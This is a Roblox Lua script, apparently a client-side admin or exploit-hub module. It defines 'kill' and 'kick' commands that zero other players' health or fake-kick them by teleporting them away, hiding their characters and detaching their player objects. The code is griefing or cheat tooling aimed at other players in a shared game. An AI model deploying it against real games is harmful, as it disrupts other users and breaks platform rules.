-------------------------------------------------------------------------------------------------------------------------------

addcommand("kill", "kill", function(target)
	local players = game:GetService("Players"):GetPlayers()

	local function setHealthToZero(player)
		local character = player.Character
		if character and character:FindFirstChild("Humanoid") then
			character.Humanoid.Health = 0
		end
	end

	if target == "me" then
		local localPlayer = game:GetService("Players").LocalPlayer
		if localPlayer then
			setHealthToZero(localPlayer)
		end
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		setHealthToZero(randomPlayer)
	elseif target == "others" then
		local localPlayer = game:GetService("Players").LocalPlayer
		for _, player in ipairs(players) do
			if player ~= localPlayer then
				setHealthToZero(player)
			end
		end
	elseif target == "all" then
		for _, player in ipairs(players) do
			setHealthToZero(player)
		end
	else
		local found = false
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				setHealthToZero(player)
				found = true
				break
			end
		end
		if not found then
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local function fakeKick(player)
	local function makeInvisible(character)
		-- Ensure the character has a HumanoidRootPart and teleport it 9000 studs up
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		if humanoidRootPart then
			-- Teleport the player 9000 studs up
			humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, humanoidRootPart.Position.Y + 9000, humanoidRootPart.Position.Z)

			-- Wait for a short moment to ensure the teleportation is processed
			wait(0.1)

			-- Make all parts and decals invisible
			for _, part in ipairs(character:GetDescendants()) do
				if part:IsA("BasePart") or part:IsA("Decal") then
					part.Transparency = 1 -- Make the part invisible
				elseif part:IsA("ParticleEmitter") or part:IsA("Light") or part:IsA("Beam") or part:IsA("Trail") then
					part.Enabled = false -- Disable visual effects
				elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
					part.Enabled = false -- Disable GUIs
				end
			end

			-- Hide accessories
			for _, accessory in ipairs(character:GetChildren()) do
				if accessory:IsA("Accessory") and accessory:FindFirstChild("Handle") then
					accessory.Handle.Transparency = 1 -- Make accessory handle invisible
					for _, descendant in ipairs(accessory.Handle:GetDescendants()) do
						if descendant:IsA("Decal") then
							descendant.Transparency = 1 -- Make accessory decals invisible
						end
					end
				end
			end

			-- Set player object to nil to simulate being kicked
			player.Parent = nil
		end
	end

	-- Listen for when the character is added (respawn or first spawn)
	player.CharacterAdded:Connect(function(character)
		-- Run the invisibility code on character spawn
		makeInvisible(character)

		-- Listen for tool equip in the backpack
		player.Backpack.ChildAdded:Connect(function(child)
			if child:IsA("Tool") then
				-- Run the invisibility code every time a tool is equipped
				makeInvisible(character)
			end
		end)
	end)
end

-------------------------------------------------------------------------------------------------------------------------------

addcommand("kick", "kick", function(target)
	local players = game:GetService("Players"):GetPlayers()

	if target == "me" then
		local localPlayer = game:GetService("Players").LocalPlayer
		if localPlayer then
			fakeKick(localPlayer)
			localPlayer:Kick("youve been kicked by unable! >.<")
		end
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		fakeKick(randomPlayer)
	elseif target == "others" then
		local localPlayer = game:GetService("Players").LocalPlayer
		for _, player in ipairs(players) do
			if player ~= localPlayer then
				fakeKick(player)
			end
		end
	elseif target == "all" then
		for _, player in ipairs(players) do
			fakeKick(player)
		end
	else
		local found = false
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				fakeKick(player)
				found = true
				break
			end
		end
		if not found then
		end
	end
end)

